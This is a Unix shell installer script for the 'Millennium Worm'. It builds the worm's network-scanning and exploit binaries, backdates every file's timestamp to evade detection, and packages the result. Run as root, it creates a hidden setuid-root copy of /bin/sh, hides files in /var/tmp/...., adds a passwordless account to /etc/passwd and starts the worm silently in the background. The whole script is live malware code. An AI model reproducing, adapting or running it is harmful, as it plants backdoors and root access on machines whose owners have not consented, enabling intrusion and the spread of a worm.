#!/bin/sh
# MILLENNIUM WORM SETUP SCRIPT
# ./wormup -dist = create a new build
# ./wormup & = install the worm (root)
if [ x$1 = "x-dist" ]
then
echo "Creating Millennium Worm distribution."
indent *.c
rm -f *~
echo -n "Compiling: "
for C in Hnamed q bd im qp ftpscan mwr remotecmd ftpx mws test
do
rm -f $C
gcc -Wall -O2 ${C}.c -o $C
echo -n $C" "
done
rm -f mountd
rpcgen -C mount.x && gcc -Wall -O2 mountd.c -o mountd \
>/dev/null 2>/dev/null
echo "mountd ..done"
echo -n "Fixing misc. file stuff... "
printf "" > cmd
printf "0" > infected
chmod 755 *
touch -t 010100002000.00 *
echo "done."
rm -f mworm.tgz
tar czf mworm.tgz *
echo "Finished. mworm.tgz recreated."
exit 0
fi
if [ $UID != 0 ] ; then
echo You need root to screw up this machine, sorry.
exit 0
fi
cp /bin/sh /bin/.mwsh && chmod 4755 /bin/.mwsh
mkdir /var/tmp/.... && cp mworm.tgz /var/tmp/....
echo mw::2222:555:millennium worm:/:/bin/sh >>/etc/passwd
cd /var/tmp/.... && tar xzvf mworm.tgz
./mworm >/dev/null 2>/dev/null &
echo "Millennium Worm(tm). Phear thy unix like thyself."
